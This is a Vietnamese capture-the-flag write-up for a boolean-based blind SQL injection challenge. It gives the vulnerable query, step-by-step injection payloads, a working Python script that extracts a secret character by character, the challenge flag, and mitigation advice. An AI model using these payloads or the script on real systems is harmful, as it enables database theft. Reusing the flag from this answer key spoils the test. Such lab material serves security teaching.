# Thử thách 12: BlindSearch – Giải pháp

## Loại lỗ hổng
**Blind SQL Injection (Boolean-based)**

## Mô tả
Ứng dụng có tồn tại lỗ hổng SQL Injection nhưng lại không trả về lỗi hay dữ liệu trực tiếp, mà chỉ trả về kết quả mang tính đúng/sai (boolean) dưới dạng "tìm thấy" hoặc "không tìm thấy". Do đó, chúng ta cần dùng kỹ thuật Blind SQLi để trích xuất dữ liệu từng ký tự một.

## Mã nguồn chứa lỗ hổng
```python
# VULNERABLE: raw string injection, but only returns boolean result
cur.execute(f"SELECT COUNT(*) FROM products WHERE name LIKE '%{q}%' AND visible=1")
```

## Khai thác (Exploit)

Flag được giấu trong bảng `secrets` với cột `key='flag'`. Chúng ta cần phải đoán (trích xuất) từng ký tự một thông qua Boolean-based Blind SQLi.

### Bước 1: Xác nhận lỗ hổng tồn tại
```text
' OR '1'='1
```
Kết quả: "Products found" (luôn luôn đúng).

### Bước 2: Kiểm tra xem bảng secrets có tồn tại không
```text
' OR (SELECT COUNT(*) FROM secrets) > 0 AND '1'='1
```
Kết quả: "Products found" (Xác nhận bảng có tồn tại).

### Bước 3: Tìm độ dài của Flag
```text
' OR (SELECT LENGTH(value) FROM secrets WHERE key='flag') = 28 AND '1'='1
```
Thử tăng dần con số cho tới khi ứng dụng trả về "Products found".

### Bước 4: Trích xuất từng ký tự của Flag
```text
' OR (SELECT SUBSTR(value,1,1) FROM secrets WHERE key='flag') = 'F' AND '1'='1
```
Kết quả: "Products found" (Vậy ký tự đầu tiên là 'F').

```text
' OR (SELECT SUBSTR(value,2,1) FROM secrets WHERE key='flag') = 'C' AND '1'='1
```
Kết quả: "Products found" (Ký tự thứ hai là 'C').

Tiếp tục lặp lại quá trình này cho toàn bộ các ký tự còn lại...

## Script trích xuất tự động (Python)
Thay vì làm bằng tay, bạn nên dùng script Python để gửi request tự động:
```python
import requests
import string

url = "http://[host]/"
flag = ""
charset = string.ascii_letters + string.digits + "{}_"

for pos in range(1, 30):
    for char in charset:
        payload = f"' OR (SELECT SUBSTR(value,{pos},1) FROM secrets WHERE key='flag') = '{char}' AND '1'='1"
        r = requests.get(url, params={"q": payload})
        if "Products found" in r.text:
            flag += char
            print(f"Found: {flag}")
            break
    if char == '}':
        break

print(f"Flag: {flag}")
```

## Flag
```
FCTF{bl1nd_sql1_1s_p4t13nt}
```

## Cách hoạt động
- Truy vấn nối trực tiếp chuỗi của người dùng mà không qua xử lý.
- Chúng ta có thể chèn các câu lệnh SQL trả về điều kiện True/False.
- Bằng cách đoán từng ký tự, ta có thể đánh cắp toàn bộ dữ liệu.
- Kỹ thuật này gọi là "mù" (blind) vì ta không thể thấy trực tiếp dữ liệu, mà chỉ thấy phản hồi Đúng/Sai từ ứng dụng.

## Biện pháp phòng ngừa (Mitigation)
- Sử dụng Parameterized Queries (Truy vấn có tham số):
  ```python
  cur.execute("SELECT COUNT(*) FROM products WHERE name LIKE ? AND visible=1", (f'%{q}%',))
  ```
- Không bao giờ nối (concatenate) đầu vào của người dùng trực tiếp vào SQL.
- Làm sạch (sanitize) và kiểm tra (validate) dữ liệu.
- Nên dùng các framework ORM.
- Áp dụng nguyên tắc đặc quyền tối thiểu cho user kết nối Database.
- Dùng Rate Limit (giới hạn tốc độ) để làm chậm lại các đợt tấn công tự động (brute-force).
- Sử dụng Tường lửa ứng dụng web (WAF).
